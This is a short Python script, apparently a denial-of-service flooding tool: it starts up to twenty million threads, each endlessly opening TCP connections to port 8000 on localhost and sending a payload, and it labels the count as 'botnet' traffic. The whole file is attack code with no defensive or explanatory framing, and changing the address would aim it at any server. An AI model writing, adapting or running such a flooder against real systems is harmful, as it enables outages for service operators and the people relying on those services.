import socket             
import threading
 
bot_num = 0
def DDoS():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            global bot_num
            bot_num += 1
            s.connect(('127.0.0.1', 8000)) 
            s.send(b'Package')
            print("The number of TCP traffic from botnet: " + str(bot_num))
        except Exception as e:
            pass
        
        s.close()

for i in range(20000000):
    thread = threading.Thread(target=DDoS)
    thread.start()         
    


